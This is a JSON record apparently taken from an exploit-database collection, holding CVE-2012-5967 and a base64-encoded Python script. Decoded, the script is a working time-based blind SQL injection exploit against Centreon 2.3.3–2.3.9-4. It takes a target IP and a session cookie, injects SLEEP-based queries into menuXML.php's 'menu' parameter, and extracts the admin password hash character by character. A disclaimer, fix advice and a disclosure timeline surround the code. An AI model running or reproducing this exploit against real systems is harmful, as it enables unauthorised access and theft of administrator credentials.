{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgRXhwbG9pdCBUaXRsZTogQ2VudHJlb24gMi4zLjMgLSAyLjMuOS00IG1lbnVYTUwucGhwIEJsaW5kIFNRTCBJbmplY3Rpb24gRXhwbG9pdA0KIyBEaXNjbG9zdXJlIERhdGU6IERlY2VtYmVyIDEyLCAyMDEyDQojIEF1dGhvcjogbW9kcHIwYmUgKEBtb2RwcjBiZSkNCiMgUGxhdGZvcm06IExpbnV4DQojIFRlc3RlZCBvbjogQ2VudHJlb24gRW50ZXJwcmlzZSBTZXJ2ZXIgd2l0aCBDZW50cmVvbiAyLjMuOS00IG9uIENlbnRPUyA1LjUgeDg2XzY0IChGaW5hbCkNCiMgU29mdHdhcmUgTGluazogaHR0cDovL3d3dy5jZW50cmVvbi5jb20vQ29udGVudC1Eb3dubG9hZC9kb3dubG9hZC1jZW50cmVvbi1lbnRlcnByaXNlLXNlcnZlcg0KIyBSZWZlcmVuY2VzOiBodHRwOi8vd3d3LnNwZW50ZXJhLmNvbS8yMDEyLzEyL2NlbnRyZW9uLWVudGVycHJpc2Utc2VydmVyLWJsaW5kLXNxbC1pbmplY3Rpb24vDQojIENWRS1JRDogQ1ZFLTIwMTItNTk2Nw0KDQojIyMgRElTQ0xBSU1FUiANCiMgU2NyaXB0IHByb3ZpZGVkICdhcyBpcycsIHdpdGhvdXQgYW55IHdhcnJhbnR5Lg0KIyBGb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMgb25seS4NCiMgRG8gbm90IHVzZSB0aGlzIGNvZGUgdG8gZG8gYW55dGhpbmcgaWxsZWdhbC4NCg0KIyMjIFNvZnR3YXJlIERlc2NyaXB0aW9uDQojIFRoZSBDZW50cmVvbiBTb2Z0d2FyZSBTdWl0ZSBpcyBhIHNldCBvZiBtb2R1bGFyIHNvZnR3YXJlIHByb2dyYW1zIGRlc2lnbmVkIGZvciBtYW5hZ2luZyANCiMgYW5kIGNvbnRyb2xsaW5nIHlvdXIgaW5mb3JtYXRpb24gc3lzdGVtcy4gSXQgbGV0cyB5b3Ugc3VwZXJ2aXNlIGFuZCBtZWFzdXJlIHBlcmZvcm1hbmNlIGFuZCANCiMgcXVhbGl0eSBvZiBzZXJ2aWNlIHNvIHRoYXQgeW91IGNhbiBvcHRpbWlzZSB0aGUgdXNlIG9mIHlvdXIgcmVzb3VyY2VzLg0KDQojIyMgVnVsbmVyYWJpbGl0eSBEZXRhaWxzDQojIFZ1bG5lcmFiaWxpdHkgZm91bmQgaW4gbWVudVhNTC5waHAgaW5zaWRlIHRoZSAnbWVudScgcGFyYW1ldGVyLiBCeSBpbmplY3RpbmcgcGF5bG9hZCBhZnRlciB0aGUgDQojIG1lbnUgcGFyYW1ldGVyLCBlLmc6ICcgIEFORCBTTEVFUCg1KSBBTkQgJ21lSEwnPSdtZUhMLCB0aGUgd2ViIGFwcGxpY2F0aW9uIGh1bmcgZm9yIDUgc2Vjb25kcywgDQojIHdoaWNoIGdpdmVzIHVzIGEgY29uY2x1c2lvbiB0aGF0IHRoZSB3ZWIgYXBwbGljYXRpb24gaXMgdnVsbmVyYWJsZSB0byB0aW1lLWJhc2VkIHNxbCBpbmplY3Rpb24uDQoNCiMjIEZ1cnRoZXIgbm90ZXM6DQojIFVzZXIgd2l0aCBsb3cgcHJpdmlsZWdlIGFjY2VzcyAoZS5nOiBndWVzdCB1c2VyKSBjYW4gc3RpbGwgZXhwbG9pdCB0aGlzIHZ1bG5lcmFiaWxpdHkNCiMgVGhlIHNjcmlwdCBiZWxvdyBpcyBmb3IgUG9DIG9mIHRoZSB2dWxuZXJhYmlsaXR5IG9ubHkuIA0KDQojICAgICAgLT1dIENlbnRyZW9uIDIuMy4zIC0gMi4zLjktNCBUaW1lLWJhc2VkIEJsaW5kU1FMaSBFeHBsb2l0IFs9LQ0KIyAgICAgICAgICAgICAgIFsgYnkgbW9kcHIwYmUgIC0gcmVzZWFyY2hbYXRdc3BlbnRlcmEuY29tIF0NCiMgICAgICAgICAgICAgICAgICAgDQojICghKSBXZSBuZWVkIHRoZSB0YXJnZXQgSVA6IDE3Mi4xNi4xOTkuMTUwDQojICghKSBQdXQgdGhlIHZhbHVlIG9mIGEgdmFsaWQgUEhQU0VTU0lEIHNlc3Npb246IDN1aDUybXRsMWhsbXNoYTRubWtmdGRlNWwzDQojICgtKSBVc2luZyBUaW1lLUJhc2VkIG1ldGhvZCB3aXRoIDFzIGRlbGF5LiBUaGlzIHdpbGwgdGFrZSBzb21lIHRpbWUsIGdvIGdyYWIgYSBjb2ZmZWUuLg0KDQojICghKSBHZXR0aW5nIGFkbWluIHBhc3N3b3JkIGhhc2g6IDI5OTVjYjA2NTBjNWYxMDcyMzBlZDU2OWE4YzRkNmU1DQojICgtKSBEb25lISBBZG1pbiBwYXNzd29yZCBoYXNoIGV4dHJhY3RlZCBpbiA2NzYgc2Vjb25kcw0KDQojIyMgU29sdXRpb24NCiMgVXBkYXRlIHRvIENlbnRyZW9uIDIuNC4wIG9yIG5ld2VyLg0KDQojIyMgRGlzY2xvc3VyZSB0aW1lbGluZQ0KIyAxMC8yNi8yMDEyIC0gQnVnIGZvdW5kIGFuZCByZXBvcnRlZCB0byBDRVJUL0NDDQojIDEyLzA3LzIwMTIgLSBVcGRhdGUgZnJvbSBDRVJUL0NDIHRvIHB1Ymxpc2ggb24gMTIvMTIvMjAxMg0KIyAxMi8xMi8yMDEyIC0gU2VjdXJpdHkgYWR2aXNvcnkgcmVsZWFzZWQgdmlhIENFUlQvQ0MNCg0KaW1wb3J0IHN5cyx0aW1lLHVybGxpYix1cmxsaWIyDQoNCnByaW50ICIiIg0KLT1dIENlbnRyZW9uIDIuMy4zIC0gMi4zLjktNCBUaW1lLWJhc2VkIEJsaW5kU1FMaSBFeHBsb2l0IFs9LSANCglbIGJ5IG1vZHByMGJlICAtIHJlc2VhcmNoW2F0XXNwZW50ZXJhLmNvbSBdDQoiIiINCmhvc3QgPSByYXdfaW5wdXQoIighKSBXZSBuZWVkIHRoZSB0YXJnZXQgSVA6ICIpDQp0YXJnZXQgPSAnaHR0cDovLyVzL2NlbnRyZW9uL21lbnUveG1sL21lbnVYTUwucGhwJyAlKGhvc3QpDQoNCiMgc2lkIGlzIHRoZSBzYW1lIGFzIFBIUFNFU1NJRCBzZXNzaW9uIHZhbHVlLCBzbyBwdXQgdGhlIHZhbHVlIG9mIFBIUFNFU1NJRCBoZXJlDQpzaWQgPSByYXdfaW5wdXQoIighKSBQdXQgdGhlIHZhbHVlIG9mIGEgdmFsaWQgUEhQU0VTU0lEIHNlc3Npb246ICIpDQpjb29raWUgPSAnUEhQU0VTU0lEPSVzJyAlKHNpZCkNCg0KIyBTUUxpIGRlbGF5LCB0ZXN0ZWQgb24gTEFOIGVudmlyb25tZW50LiANCiMgQ29uc2lkZXIgaWYgaXQncyBhIHJlbW90ZSB0YXJnZXQsIHlvdSBtYXkgaW5jcmVhc2UgdGhlIGRlbGF5IHZhbHVlIChkZWZhdWx0OiAxIHNlY29uZHMpDQpkZWxheT0xDQoNCnByaW50ICIoLSkgVXNpbmcgVGltZS1CYXNlZCBtZXRob2Qgd2l0aCAlZHMgZGVsYXkuIFRoaXMgd2lsbCB0YWtlIHNvbWUgdGltZSwgZ28gZ3JhYiBhIGNvZmZlZS4uXG4iJWludChkZWxheSkNCg0KZGVmIEhleDJEZXMoaXRlbSk6DQogICAgICAgCXJldHVybiBvcmQoaGV4KGl0ZW0pLnJlcGxhY2UoJzB4JywnJykpDQoNCmRlZiBhZG1pbmhhc2gobSxuKToNCgkjYm9ycm93IGZyb20gU1FMbWFwIDopDQoJYWRtaW5xdWVyeT0oIicgQU5EIDk5OTk9SUYoKE9SRChNSUQoKFNFTEVDVCBJRk5VTEwoQ0FTVChjb250YWN0X3Bhc3N3ZCBBUyBDSEFSKSwweDIwKSBGUk9NIGNvbnRhY3QiDQoJCSAgICIgV0hFUkUgY29udGFjdF9pZD0xIExJTUlUIDAsMSksJXMsMSkpID4gJXMpLFNMRUVQKCVzKSw5OTk5KSAgQU5EICdtRWhMJz0nbUVoTCIgJShtLG4sZGVsYXkpKQ0KCQ0KCXZhbHVlID0geyAnbWVudSc6ICcyJythZG1pbnF1ZXJ5LA0KCQkJICAnc2lkJzogJyVzJyUoc2lkKSAgfQ0KCQ0KCXVybCA9ICIlcz8lcyIgJSh0YXJnZXQsdXJsbGliLnVybGVuY29kZSh2YWx1ZSkpDQoJcmVxID0gdXJsbGliMi5SZXF1ZXN0KHVybCkNCglyZXEuYWRkX2hlYWRlcignQ29va2llJywgY29va2llKQ0KCXRyeTogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgCQlzdGFydHRpbWU9dGltZS50aW1lKCkNCiAgICAJCXJlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKHJlcSkgICAgIA0KICAgIAkJZW5kdGltZSA9IHRpbWUudGltZSgpDQogICAgCQlyZXR1cm4gaW50KGVuZHRpbWUtc3RhcnR0aW1lKQ0KCWV4Y2VwdDogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAJCXByaW50ICdcbigtKSBVaCBvaCEgRXhwbG9pdCBmYWlsLi4nICAgICAgICAgICAgICAgIA0KICAgIAkJc3lzLmV4aXQoMCkNCg0Kc3lzLnN0ZG91dC53cml0ZSgnKCEpIEdldHRpbmcgYWRtaW4gcGFzc3dvcmQgaGFzaDogJykNCnN5cy5zdGRvdXQuZmx1c2goKQ0KDQpzdGFydHRpbWUgPSB0aW1lLnRpbWUoKQ0KZm9yIG0gaW4gcmFuZ2UoMSwzMyk6DQoJZm9yIG4gaW4gcmFuZ2UoMCwxNik6DQoJCXdrdHR1bmdndSA9IGFkbWluaGFzaChtLEhleDJEZXMobikpDQoJCWlmICh3a3R0dW5nZ3UgPCBkZWxheSk6CQkJCQ0KCQkJc3lzLnN0ZG91dC53cml0ZShjaHIoSGV4MkRlcyhuKSkpDQoJCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJCWJyZWFrDQplbmR0aW1lID0gdGltZS50aW1lKCkNCnByaW50ICJcbigtKSBEb25lISBBZG1pbiBwYXNzd29yZCBoYXNoIGV4dHJhY3RlZCBpbiAlZCBzZWNvbmRzIiAlaW50KGVuZHRpbWUtc3RhcnR0aW1lKQ==", 
    "filename": "platforms/php/webapps/23362.py", 
    "id": "23362", 
    "cves": [
        "CVE-2012-5967"
    ]
}